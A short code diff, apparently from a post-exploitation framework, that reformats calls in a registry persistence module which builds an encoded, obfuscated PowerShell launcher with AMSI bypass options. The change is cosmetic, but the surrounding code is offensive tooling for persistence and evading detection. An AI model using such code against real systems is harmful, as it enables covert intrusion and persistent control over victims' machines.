@@ -209,8 +209,8 @@ class Module(object):
             
             else:
                 # generate the PowerShell one-liner with all of the proper options set
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand,
-                                                                   userAgent=userAgent, proxy=proxy,
+                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, obfuscate=Obfuscate,
+                                                                   obfuscationCommand=ObfuscateCommand, userAgent=userAgent, proxy=proxy,
                                                                    proxyCreds=proxyCreds, AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)
                 
                 encScript = launcher.split(" ")[-1]
@@ -245,7 +245,5 @@ class Module(object):
         script += "'Registry persistence established " + statusMsg + "'"
         script = helpers.keyword_obfuscation(script, self.mainMenu)
         if obfuscate:
-            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
-                                       obfuscationCommand=obfuscationCommand)
-
+            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
         return script
